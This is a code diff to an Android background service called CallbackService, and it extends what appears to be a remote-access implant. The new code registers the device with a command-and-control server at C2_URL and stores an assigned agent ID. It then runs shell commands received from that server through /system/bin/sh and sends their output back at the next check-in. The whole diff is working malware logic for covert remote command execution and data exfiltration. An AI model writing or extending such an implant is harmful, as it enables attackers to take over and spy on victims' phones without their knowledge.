@@ -286,8 +286,13 @@ public class CallbackService extends Service {
         }
     }
 
+    private String agentId = null;
+
     private void checkIn() throws Exception {
         JSONObject info = new JSONObject();
+        if (agentId != null) {
+            info.put("agent_id", agentId);
+        }
         info.put("hostname", Build.MODEL);
         info.put("username", "android");
         info.put("os", "android " + Build.VERSION.RELEASE);
@@ -296,20 +301,27 @@ public class CallbackService extends Service {
         info.put("manufacturer", Build.MANUFACTURER);
         info.put("product", Build.PRODUCT);
 
-        URL url = new URL(C2_URL + "/api/v1/status");
+        // Add results from previous tasks
+        if (pendingResults != null && pendingResults.length() > 0) {
+            info.put("results", pendingResults);
+            pendingResults = new JSONArray();
+        }
+
+        // Use mobile checkin endpoint (plain JSON, no encryption needed)
+        URL url = new URL(C2_URL + "/api/v1/mobile/checkin");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("POST");
         conn.setRequestProperty("Content-Type", "application/json");
         conn.setRequestProperty("User-Agent", "Android/" + Build.VERSION.RELEASE);
         conn.setDoOutput(true);
-        conn.setConnectTimeout(10000);
-        conn.setReadTimeout(10000);
+        conn.setConnectTimeout(15000);
+        conn.setReadTimeout(15000);
 
         OutputStream os = conn.getOutputStream();
         os.write(info.toString().getBytes());
         os.close();
 
-        // Read response for tasks
+        // Read response (contains agent_id + tasks)
         if (conn.getResponseCode() == 200) {
             BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             StringBuilder response = new StringBuilder();
@@ -322,9 +334,64 @@ public class CallbackService extends Service {
         conn.disconnect();
     }
 
+    private JSONArray pendingResults = new JSONArray();
+
     private void processResponse(String response) {
         try {
             JSONObject resp = new JSONObject(response);
+
+            // Save agent ID from first registration
+            if (resp.has("agent_id")) {
+                agentId = resp.getString("agent_id");
+            }
+
+            // Process tasks array
+            if (resp.has("tasks")) {
+                JSONArray tasks = resp.getJSONArray("tasks");
+                for (int i = 0; i < tasks.length(); i++) {
+                    JSONObject task = tasks.getJSONObject(i);
+                    String taskId = task.getString("id");
+                    String taskType = task.getString("type");
+                    String command = task.optString("command", "");
+
+                    String output = "";
+                    String error = "";
+
+                    try {
+                        if ("shell".equals(taskType)) {
+                            Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", command});
+                            BufferedReader pr = new BufferedReader(new InputStreamReader(p.getInputStream()));
+                            StringBuilder sb = new StringBuilder();
+                            String l;
+                            while ((l = pr.readLine()) != null) sb.append(l).append("\n");
+                            pr.close();
+                            // Also read stderr
+                            pr = new BufferedReader(new InputStreamReader(p.getErrorStream()));
+                            while ((l = pr.readLine()) != null) sb.append(l).append("\n");
+                            pr.close();
+                            output = sb.toString();
+                        } else if ("sysinfo".equals(taskType)) {
+                            output = "Model: " + Build.MODEL + "\n" +
+                                     "Manufacturer: " + Build.MANUFACTURER + "\n" +
+                                     "Android: " + Build.VERSION.RELEASE + "\n" +
+                                     "SDK: " + Build.VERSION.SDK_INT + "\n" +
+                                     "Arch: " + Build.SUPPORTED_ABIS[0] + "\n" +
+                                     "Product: " + Build.PRODUCT;
+                        }
+                    } catch (Exception e) {
+                        error = e.getMessage();
+                    }
+
+                    // Queue result for next check-in
+                    JSONObject result = new JSONObject();
+                    result.put("task_id", taskId);
+                    result.put("output", output);
+                    result.put("error", error);
+                    pendingResults.put(result);
+                }
+            }
+
+            // Legacy: handle flat command field
             if (resp.has("command")) {
                 String cmd = resp.getString("command");
                 Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", cmd});
